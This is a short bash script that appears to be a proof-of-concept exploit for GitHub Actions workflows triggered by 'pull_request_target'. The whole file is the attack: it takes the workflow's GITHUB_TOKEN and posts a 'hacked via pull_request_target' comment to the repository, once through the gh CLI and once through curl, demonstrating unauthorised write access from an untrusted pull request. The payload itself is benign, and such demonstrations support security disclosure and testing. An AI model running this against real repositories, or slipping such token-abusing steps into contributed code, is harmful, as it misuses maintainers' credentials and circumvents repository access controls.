#!/bin/bash
set -e  # Exit on error

echo "Starting GitHub API request..."

gh api "repos/${GITHUB_REPOSITORY}/issues/${GITHUB_REF##*/}/comments" \
  -f body='👋 hacked via pull_request_target' \
  --header "Authorization: token $GITHUB_TOKEN"

echo "GitHub API request completed!"

PR="${GITHUB_REF##*/}"
curl -s -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  -d '{"body":"👋 hacked via pull_request_target!"}' \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR}/comments"
